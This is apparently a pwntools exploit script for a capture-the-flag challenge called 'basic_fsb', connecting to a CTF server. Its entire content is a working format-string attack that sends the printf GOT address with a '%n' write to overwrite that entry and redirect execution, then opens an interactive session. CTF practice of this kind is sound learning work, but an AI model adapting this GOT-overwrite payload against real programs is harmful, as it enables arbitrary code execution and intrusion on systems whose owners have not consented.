from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3002)
e = ELF('./basic_fsb')

print_got = e.got['printf']

payload = ''
payload += p32(print_got)
payload += "%134514096x%n"

p.recvuntil('input : ')
p.send(payload)
p.interactive()